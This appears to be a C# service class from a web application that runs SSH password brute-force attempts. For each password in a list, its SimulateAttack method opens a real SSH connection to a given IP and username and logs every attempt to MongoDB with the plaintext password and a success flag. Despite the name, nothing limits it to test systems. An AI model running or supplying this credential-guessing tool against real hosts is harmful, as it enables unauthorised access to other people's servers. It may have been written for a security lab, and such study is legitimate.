using Renci.SshNet;
using System.Linq;
using Microsoft.EntityFrameworkCore;

public class SshBruteForceService
{
    private readonly AppDbContext _db;          // Postgres
    private readonly MongoLogService _mongo;    // Mongo

    public SshBruteForceService(AppDbContext db, MongoLogService mongo)
    {
        _db = db;
        _mongo = mongo;
    }

    public async Task<List<SshAttemptLog>> SimulateAttack(string ip, string username, List<string> passwords)
    {
        var results = new List<SshAttemptLog>();

        foreach (var pwd in passwords)
        {
            var log = new SshAttemptLog
            {
                IPAddress = ip,
                Username = username,
                Password = pwd,
                Timestamp = DateTime.UtcNow
            };

            try
            {
                using var client = new SshClient(ip, username, pwd);
                client.Connect();
                log.Success = client.IsConnected;
                client.Disconnect();
            }
            catch
            {
                log.Success = false;
            }

            // 1) Always store logs in Mongo for unlimited scale
            await _mongo.InsertLogAsync(log);

            // 2) Optionally store to Postgres if you want everything OR just analytics
            // _db.SshAttemptLogs.Add(log);

            results.Add(log);
        }

        // If you decided to store in Postgres, un-comment below
        // await _db.SaveChangesAsync();

        return results;
    }

    // If your GET logs route is now primarily from Mongo,
    // you can either remove this or keep it for advanced analytics
    public async Task<List<SshAttemptLog>> GetAllLogsFromMongo()
    {
        return await _mongo.GetAllLogsAsync();
    }

    public async Task<List<SshAttemptLog>> GetAllLogsFromPostgres()
    {
        return await _db.SshAttemptLogs
            .OrderByDescending(log => log.Timestamp)
            .ToListAsync();
    }
}